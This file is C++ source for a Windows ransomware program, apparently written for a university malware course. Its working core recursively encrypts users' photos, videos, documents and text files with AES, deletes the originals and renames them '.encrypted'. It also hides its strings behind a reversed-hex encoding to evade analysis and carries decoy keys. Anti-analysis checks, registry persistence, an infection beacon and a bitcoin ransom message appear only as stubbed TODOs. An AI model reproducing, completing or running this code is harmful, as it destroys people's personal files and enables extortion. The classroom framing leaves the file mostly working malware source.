//
// CSS 579
// Team Malware Project
//
// Team: Christopher Coy
//       Clarissa Pendleton
//       Samantha Smith
//       Skylar Onstot
//
// Malware Type: Ransomware
//

//
// The encryption/decryption key is:
//
//    Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy
//
// which is a Base64 encode of "ChrisClarissaSamanthaSkylar"
//

#include <fstream>
#include <string>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <wincrypt.h>
#include <Shlobj.h>

namespace fs = std::experimental::filesystem;

#define CLASSNAME "uwbcss579"
#define BLOCK_LEN 128
#define GET_USERS_DIR_FAILED -25
//#define TRACEOUTPUT // Uncomment '#define TRACEOUTPUT' to enable trace logging output
					  // Comment out '#define TRACEOUTPUT' prior to project submission to 
					  // minimize the strings in the program

// Global Variables
bool g_Verbosity = false;
bool g_Decrypt = false;

// Encoded String Declarations
//
// Use StringToHexGenerator.exe to generate the Hex version of a string you want to obfuscate
//
std::string strAppData = "16471644070714"; // AppData
std::string strAllUsers = "372756375502c6c614"; // All Users
std::string strPublicAcctPics = "375627574736960547e657f6363614c53696c6265705"; //  Public\\AccountPictures
std::string strExtBmp  = "07d626e2";   // .bmp
std::string strExtJpg  = "7607a6e2";   // .jpg
std::string strExtJpeg = "765607a6e2"; // .jpeg
std::string strExtPng  = "76e607e2";    // .png
std::string strExtGif  = "669676e2";    // .gif
std::string strExtMp4  = "4307d6e2";  // .mp4
std::string strExtMpg  = "7607d6e2"; // .mpg
std::string strExtMpeg = "765607d6e2"; // .mpeg
std::string strExtMov  = "67f6d6e2"; // .mov
std::string strExtMkv  = "67b6d6e2"; // .mkv
std::string strExtM2ts = "374723d6e2"; // .m2ts
std::string strExtMp3  = "3307d6e2"; // .mp3
std::string strExtM4a  = "1643d6e2"; // .m4a
std::string strExtDoc  = "36f646e2"; // .doc
std::string strExtDocx = "8736f646e2"; // .docx
std::string strExtXls  = "37c687e2"; // .xls
std::string strExtXlsx = "8737c687e2"; // .xlsx
std::string strExtPpt  = "470707e2"; // .ppt
std::string strExtPptx = "87470707e2"; // .pptx
std::string strExtPdf  = "664607e2"; // .pdf
std::string strExtTxt  = "478747e2"; // .txt
std::string strExtEncrypted = "46564707972736e656e2"; // .encrypted
std::string strBanner = "128796274716d40256864702f6470256d6f636c65675"; // "Welcome to the Matrix!"
std::string strPasswordNeeded = "e25657e69647e6f63602f64702e6f6964707f60246f2025686470286479677024627f6773737160702160256469667f6270702473757d60257f695"; // "You must provide a password with the /d option to continue."
std::string strPwdMessage = "02a34627f6773737160702568647024656275647e6560257f695"; // "You entered the password: "
std::string strRecoveryFailed = "e24627f67737371607022757f697028647967702d6162776f627070256864702e6572756250202e2275667f636562702f647024656c6961666023756c6966602d5"; // "] files failed to recover.  Rerun the program with your password."
std::string strAllYourFilesAreBelongToUs = "c5a302121212375502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To Us!!! :\\"
std::string strAllYourFilesAreBelongToYou = "e3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To You!!! :>"
std::string strNotAllYourFilesAreBelongToYou = "c3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c6140247f6e4"; // "Not All Your Files Are Belong To You!!! :<"


// Function Declarations
DWORD FindFiles();
DWORD FindEncryptedFiles(std::string decryptionKey);
bool EncryptAndDeleteThisFile(std::string path);
bool DecryptThisFile(std::string path, std::string decryptionKey);
bool ExcludePath(std::string checkString);
bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
void SendInfectionBeacon(DWORD dwEncryptedFileCount);
void RansomMessage(DWORD dwEncryptedFileCount);
bool AnalysisCheck();
void SaveStartupPersistence();
void DeleteStartupPersistence();
void SaveInfectionStatus(DWORD dwInfectionStatus);
DWORD GetInfectionStatus();
void SaveRansomStatus(DWORD dwRansomStatus);
DWORD GetRansomStatus();
void PrintProgress();
std::string wstrtostr(const std::wstring& wstr);
void HexToString(const std::string hexstr, std::string& str);
void DecodeStrings();



int main(int argc, char* argv[])
{ 
	std::string keyDecrypt = "";
	DWORD dwEncryptionResult = 0;
	DWORD dwDecryptionResult = 0;

	//
	// Check for debugger, execution in a VM, or other dynamic analysis 
	//
	if (AnalysisCheck())
	{
		// Found evidence of some kind of dynamic analysis
		// Halting program execution - why make it easy on the other teams?? :)
		return 0;
	}

	DecodeStrings();
	
	std::cout << strBanner << std::endl;
	
	for (int i = 1; i < argc; ++i) 
	{
		if (std::string(argv[i]) == "/v") 
		{
			g_Verbosity = true;
		}
		else if (std::string(argv[i]) == "/d")
		{
			if (i + 1 < argc)
			{ 
				g_Decrypt = true;

				keyDecrypt = argv[++i];
			}
			else
			{ 
				// There was no key provided with the /d option.

				// Obfuscating the string "You must provide a password with the /d option to continue." from analysis tools
				// "You must provide a password with the /d option to continue." 
				std::cout << strPasswordNeeded << std::endl;

				return 0;  // Halt program exection
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Verbosity:  Enabled" << std::endl;
		std::cout << "Operation:  " << g_Decrypt << "  [1: Decrypt; 0: Encrypt]" << std::endl;
		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
		std::cout << std::endl;
	}
#endif

	// Encrypt or Decrypt files?
	if (!g_Decrypt)
	{
		//
		// Encrypt Files
		//

		PrintProgress();

		// Finds, Encrypts, and Deletes important personal files
		dwEncryptionResult = FindFiles();

		if (dwEncryptionResult == GET_USERS_DIR_FAILED)
		{
			// Couldn't find the Users directory 
			return 0; // Halt program exection
		}

		// Save status to Registry
		SaveStartupPersistence();
		SaveInfectionStatus(1);
		SaveRansomStatus(0);

		// Send network beacon to report ransom/encryption completed
		SendInfectionBeacon(dwEncryptionResult);

		// Display message to user demanding bitcoin payment for decryption key
		RansomMessage(dwEncryptionResult);
	}
	else
	{
		//
		// Decrypt Files
		//

		// Finds .encrypted files, and decrypts them

		// Obfuscating the string "You entered the password: " from analysis tools
		// "You entered the password: " << keyDecrypt 
		std::cout << strPwdMessage << keyDecrypt << std::endl;

		PrintProgress();

		// Save status to Registry
		DeleteStartupPersistence();
		SaveInfectionStatus(1);
		SaveRansomStatus(1);

		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
		if (dwDecryptionResult > 0)
		{
			// Obfuscating the string "] files failed to recover.  Rerun the program with your password." from analysis tools
			// "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << "] files failed to recover.  Rerun the program with your password."
			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << strRecoveryFailed << std::endl;
		}
	}


	// End with a fun message
	if (!g_Decrypt)
	{
		// Obfuscating the string "All Your Files Are Belong To Us!!! :\\" from analysis tools
		// "All Your Files Are Belong To Us!!! :\\" 
		std::cout << std::endl << strAllYourFilesAreBelongToUs << std::endl;
	}
	else
	{
		if (dwDecryptionResult > 0)
		{
			// Obfuscating the string "Not All Your Files Are Belong To You!!! :<" from analysis tools
			// "Not All Your Files Are Belong To You!!! :<" 
			std::cout << std::endl << strNotAllYourFilesAreBelongToYou << std::endl;
		}
		else
		{
			// Obfuscating the string "All Your Files Are Belong To You!!! :>" from analysis tools
			// "All Your Files Are Belong To You!!! :>" 
			std::cout << std::endl << strAllYourFilesAreBelongToYou << std::endl;
		}
	}
}

//
// Supporting functions
//

void DecodeStrings()
{
	// Decode the Encoded String Declarations into the actual text strings for use throughout the program

	HexToString(strAppData, strAppData);
	HexToString(strAllUsers, strAllUsers);
	HexToString(strPublicAcctPics, strPublicAcctPics);

	HexToString(strExtBmp, strExtBmp);
	HexToString(strExtJpg, strExtJpg);
	HexToString(strExtJpeg, strExtJpeg);
	HexToString(strExtPng, strExtPng);
	HexToString(strExtGif, strExtGif);
	HexToString(strExtMp4, strExtMp4);
	HexToString(strExtMpg, strExtMpg);
	HexToString(strExtMpeg, strExtMpeg);
	HexToString(strExtMov, strExtMov);
	HexToString(strExtMkv, strExtMkv);
	HexToString(strExtM2ts, strExtM2ts);
	HexToString(strExtMp3, strExtMp3);
	HexToString(strExtM4a, strExtM4a);
	HexToString(strExtDoc, strExtDoc);
	HexToString(strExtDocx, strExtDocx);
	HexToString(strExtXls, strExtXls);
	HexToString(strExtXlsx, strExtXlsx);
	HexToString(strExtPpt, strExtPpt);
	HexToString(strExtPptx, strExtPptx);
	HexToString(strExtPdf, strExtPdf);
	HexToString(strExtTxt, strExtTxt);
	HexToString(strExtEncrypted, strExtEncrypted);

	HexToString(strBanner, strBanner);
	HexToString(strPasswordNeeded, strPasswordNeeded);
	HexToString(strPwdMessage, strPwdMessage);
	HexToString(strRecoveryFailed, strRecoveryFailed);

	HexToString(strAllYourFilesAreBelongToUs, strAllYourFilesAreBelongToUs);
	HexToString(strAllYourFilesAreBelongToYou, strAllYourFilesAreBelongToYou);
	HexToString(strNotAllYourFilesAreBelongToYou, strNotAllYourFilesAreBelongToYou);
}

bool AnalysisCheck()
{
	// TODO: Add code to check for a debugger, execution in a VM, or other dynamic analysis indicators

	// Returning TRUE will halt program execution
	// Returning FALSE will allow program execution to proceed

	return false; // stubbed for now allow execution
}

void SendInfectionBeacon(DWORD dwEncryptedFileCount)
{
	// TODO: Add code to send an infection beacon to a website, twitter, 
	//       slack, email, or some other network destination to track infections
	//
	// Beacon data could include machinename, username, # files encrypted, etc
}

void RansomMessage(DWORD dwEncryptedFileCount)
{
	// TODO: Add code to display a ransom message to the user, and to 
	//       demand bitcoin payment to get the decryption key
	//
	// This could be a MessageBox or a HTML page
	//
	// The message text should be encoded (base64) if stored in the code,
	// or it could be downloaded from a remote site
}

void SaveStartupPersistence()
{
	// TODO: Save startup persistence data to the Registry
	//
	// By continuing to run program at startup, any new files will be 
	// encrypted until payment is received
	//
}

void DeleteStartupPersistence()
{
	// TODO: Detel startup persistence data from the Registry
}

void SaveInfectionStatus(DWORD dwInfectionStatus)
{
	// TODO: Save infection status to the Registry
	//       Create a Key+Value to store dwInfectionStatus
	//       This can be used to avoid double infection
}

DWORD GetInfectionStatus()
{
	// TODO: Get infection status from the Registry
	//       Read a Key+Value to get dwInfectionStatus
	//       This can be used to avoid double infection

	return 0;
}

void SaveRansomStatus(DWORD dwRansomStatus)
{
	// TODO: Save ransom status to the Registry
	//       Create a Key+Value to store dwRansomStatus
	//       This can be used to track whether the user paid or not
}

DWORD GetRansomStatus()
{
	// TODO: Get ransom status from the Registry
	//       Read a Key+Value to get dwRansomStatus
	//       This can be used to track whether the user paid or not

	return 0;
}

void PrintProgress()
{
	Sleep(150);
	for (int i = 0; i < 6; i++)
	{
		std::cout << ".";
		Sleep(150);
	}
	std::cout << "." << std::endl;
}

bool ExcludePath(std::string checkString)
{
	// Check for paths to exclude from encryption/decryption process

	if (checkString.find(strAppData) != std::string::npos)
	{
		// Exclude files in the AppData directory
		return true;
	}
	else if (checkString.find(strAllUsers) != std::string::npos)
	{
		// Exclude files in the All Users directory
		return true;
	}
	else if (checkString.find(strPublicAcctPics) != std::string::npos)
	{
		// Exclude files in the Public\AccountPictures directory
		return true;
	}
	else
	{
		// Do not exclude this path
		return false;
	}
}

bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key)
{
	// Performs file encryption operation

	// Note: the param 'key' is not used anywhere - it is a false flag

	wchar_t keyDefault0[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
	wchar_t keyDefault1[] = L"Tm90TXlNb25rZXlzTm90TXlDaXJjdXM="; // false flag key
	wchar_t keyDefault2[] = L"VVcgQ1NTIDU3OSBUZWFtIFByb2plY3Q="; // false flag key
	wchar_t keyDefault3[] = L"Q2xhcmlzc2FTYW1hbnRoYVNreWxhckNocmlz"; // false flag key
	wchar_t keyDefault4[] = L"U2FtYW50aGFTa3lsYXJDaHJpc0NsYXJpc3Nh"; // false flag key
	wchar_t keyDefault5[] = L"U2t5bGFyQ2hyaXNDbGFyaXNzYVNhbWFudGhh"; // false flag key

	wchar_t* keyString = keyDefault0;
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToEncrypt.begin(), fileToEncrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Key:         " << keyDefault0 << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileEncrypted.c_str() << std::endl;
	}
#endif

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;
#endif

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;
#endif

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD err = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE dataChunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);

	while (bResult = ReadFile(hInputFile, dataChunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Finalizing encrypted data file." << std::endl;
#endif
		}

		// Encrypt data
		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, dataChunk, &outputLength, chunkSize))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "CryptEncrypt failed :(" << std::endl;
#endif

			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, dataChunk, outputLength, &written, NULL))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
#endif

			break;
		}

		memset(dataChunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return true;
}

bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key)
{
	// Performs file decryption operation

	// Note: the param 'key' is the actual key used for file decryption !!
	
	LPCWSTR keyString = std::wstring(key.begin(), key.end()).c_str();
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing with CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToDecrypt.begin(), fileToDecrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileRestored.begin(), fileRestored.end()).c_str();

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Key:         " << key.c_str() << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToDecrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileRestored.c_str() << std::endl;
	}
#endif

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;
#endif

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;
#endif

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD err = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE dataChunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);
	bool retValue = true;

	while (bResult = ReadFile(hInputFile, dataChunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Finalizing decrypted data file." << std::endl;
#endif
		}

		// Decrypt data
		if (!CryptDecrypt(hCryptKey, NULL, isFinal, 0, dataChunk, &outputLength))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
			{
				std::cout << "CryptDecrypt  failed :(" << std::endl;
				DWORD dwStatus;
				dwStatus = GetLastError();

				LPVOID lpMsgBuf;
				FormatMessage(
					FORMAT_MESSAGE_ALLOCATE_BUFFER |
					FORMAT_MESSAGE_FROM_SYSTEM |
					FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL,
					dwStatus,
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
					(LPTSTR)& lpMsgBuf,
					0, NULL);

				std::cout << "CryptDecrypt status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
				std::wcout << "CryptDecrypt error:  " << (LPTSTR)lpMsgBuf;
			}
#endif

			retValue = false;
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, dataChunk, outputLength, &written, NULL))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
#endif

			retValue = false;
			break;
		}

		memset(dataChunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return retValue;
}

bool EncryptAndDeleteThisFile(std::string path)
{
#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Encrypting " << path << " ..." << std::endl;
#endif

	bool fEncrypted = false;
	bool fDeleted = false;

	std::string pathEncrypted = path;
	pathEncrypted.append(strExtEncrypted);

	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");  // NotMyMonkeysNotMyCircus is a false flag

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Encrypt result: " << fEncrypted << std::endl;
#endif

	if (fEncrypted)
	{
		// Only delete original file if Encryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif
		}
		else
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
#endif
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << std::endl;
#endif

	if (fEncrypted)
		return true;
	else
		return false;
}

bool DecryptThisFile(std::string path, std::string decryptionKey)
{
#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Decrypting " << path << " ..." << std::endl;
#endif

	bool fDecrypted = false;
	bool fDeleted = false;

	std::string pathRestoreTargetFile = path;
	pathRestoreTargetFile.erase(pathRestoreTargetFile.end() - 10, pathRestoreTargetFile.end());

	fDecrypted = Decryptor(path, pathRestoreTargetFile, decryptionKey);

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Decryption result: " << fDecrypted << std::endl;
		std::cout << "Restored file:  " << pathRestoreTargetFile << std::endl;
	}
#endif

	if (fDecrypted)
	{
		// Only delete encrypted file if Decryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif
		}
		else
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
#endif
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << std::endl;
#endif

	if (fDecrypted)
		return true;
	else
		return false;
}

DWORD FindFiles()
{
	DWORD dwFileCounter = 0;
	DWORD dwEncryptionCounter = 0;

	// File extension filters to target important files
	// Using lowercase extenstions
	// Restricting search path to the Users directory
	std::string path = ""; // c:\\users
	// Get the Users directory from the system
	PWSTR pszUsersFolder = NULL;
	HRESULT hr = S_OK;
	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
	if (!FAILED(hr))
	{
		// Found the Users directory, save it 
		path = wstrtostr(pszUsersFolder);
		CoTaskMemFree(pszUsersFolder);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Users directory:  " << path << std::endl;
		}
#endif
	}
	else
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
		}
#endif

		return GET_USERS_DIR_FAILED;
	}
	
	std::string tempExt;

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path by terminating the current loop iteration
		}

		// Convert extention to lowercase for later comparison
		tempExt = entry.path().extension().string();
		std::transform(tempExt.begin(), tempExt.end(), tempExt.begin(), ::tolower);

		if (tempExt == strExtJpg ||
			tempExt == strExtJpeg ||
			tempExt == strExtPng ||
			tempExt == strExtGif ||
			tempExt == strExtMp4 ||
			tempExt == strExtMpg ||
			tempExt == strExtMpeg ||
			tempExt == strExtMov ||
			tempExt == strExtMkv ||
			tempExt == strExtM2ts ||
			tempExt == strExtMp3 ||
			tempExt == strExtM4a ||
			tempExt == strExtBmp ||
			tempExt == strExtDoc ||
			tempExt == strExtDocx ||
			tempExt == strExtXls ||
			tempExt == strExtXlsx ||
			tempExt == strExtPpt ||
			tempExt == strExtPptx ||
			tempExt == strExtPdf ||
			tempExt == strExtTxt
			)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Encrypt file
			if (EncryptAndDeleteThisFile(entry.path().string()))
			{
				dwEncryptionCounter++;
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << dwFileCounter << std::endl;
		std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;
	}
#endif

	return dwEncryptionCounter; // dwFileCounter;
}

DWORD FindEncryptedFiles(std::string decryptionKey)
{
	DWORD dwFileCounter = 0;
	DWORD dwDecryptionCounter = 0;

	// File extension filter to target encrypted files
	// Using lowercase extenstions
	// Restricting search path to the Users directory
	std::string path = ""; // c:\\users
	// Get the Users directory from the system
	PWSTR pszUsersFolder = NULL;
	HRESULT hr = S_OK;
	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
	if (!FAILED(hr))
	{
		path = wstrtostr(pszUsersFolder);
		CoTaskMemFree(pszUsersFolder);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Users directory:  " << path << std::endl;
		}
#endif
	}
	else
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
		}
#endif

		return -25;
	}

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path by terminating the current loop iteration 
		}

		if (entry.path().extension() == strExtEncrypted)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Decrypt file
			if (DecryptThisFile(entry.path().string(), decryptionKey))
			{
				dwDecryptionCounter++;
			}
			else
			{
				std::cout << " : " << entry.path().string() << std::endl; // Output the file path/name that failed to decrypt
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << std::dec << dwFileCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
		std::cout << "Total files decrypted: " << std::dec << dwDecryptionCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
	}
#endif

	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
}

std::string wstrtostr(const std::wstring& wstr)
{
	// Convert a PWSTR to a std::string

	std::string strNewStdString;
	char* szTmp = new char[wstr.length() + 1];
	szTmp[wstr.size()] = '\0';
	WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, szTmp, (int)wstr.length(), NULL, NULL);
	strNewStdString = szTmp;
	delete[] szTmp;
	return strNewStdString;
}

void HexToString(const std::string hexstr, std::string & str)
{
	// Convert string of Hex numbers to its a std::string

	std::string hextmp(hexstr);
	std::reverse(hextmp.begin(), hextmp.end());

	str.resize((hextmp.size() + 1) / 2);

	for (size_t i = 0, j = 0; i < str.size(); i++, j++)
	{
		str[i] = (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) << 4, j++;
		str[i] |= (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) & 0xF;
	}
}